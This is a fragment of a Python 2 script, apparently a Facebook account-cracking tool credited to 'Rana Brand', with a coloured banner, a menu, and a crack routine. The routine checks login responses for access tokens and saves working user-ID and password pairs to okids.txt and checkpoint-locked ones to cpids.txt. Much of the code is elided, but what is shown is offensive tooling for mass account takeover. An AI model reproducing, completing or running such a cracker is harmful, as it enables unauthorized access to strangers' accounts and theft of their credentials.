...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Rana Brand
\033[1;92mFb \033[1;93m: Rana Brand
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open No Facebook Id')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open No Youtube Channel')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[RANA-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[RANA-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
